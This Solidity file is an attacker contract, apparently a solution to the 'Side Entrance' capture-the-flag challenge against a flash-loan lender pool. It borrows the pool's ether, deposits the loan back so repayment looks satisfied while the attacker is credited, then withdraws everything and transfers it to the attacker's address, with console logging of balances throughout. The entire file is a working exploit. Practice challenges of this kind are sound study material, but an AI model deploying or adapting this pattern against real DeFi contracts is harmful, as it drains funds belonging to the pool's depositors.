// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract SideEntranceAttackerContract {
    address payable private pool;
    address payable private attacker;

    constructor(address _pool, address _attacker) {
        pool = payable(_pool);
        attacker = payable(_attacker);
    }

    function attackerWithdraw() external {
        require(
            msg.sender == attacker,
            "[-] Only attacker can call this function"
        );
        ISideEntranceLenderPool(pool).withdraw();
        attacker.transfer(address(this).balance);
        console.log("[*] Ether in this contract: ", address(this).balance);
    }

    receive() external payable {
        console.log("\n[+] Fallback function called\n");
    }

    function attack(uint256 amount) external {
        console.log("[+] In the attack function");
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        console.log("[+] In the external function");
        require(msg.value > 0, "Not sending any ETH");
        console.log("[*] Attempting to send ether");
        console.log("[+] Ether in this contract: ", address(this).balance);
        console.log("[+] Ether in pool contract: ", address(pool).balance);

        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
        console.log("[+] Sent Ether");

        console.log("[+] Ether in this contract: ", address(this).balance);
        console.log("[+] Ether in pool contract: ", address(pool).balance);
    }
}
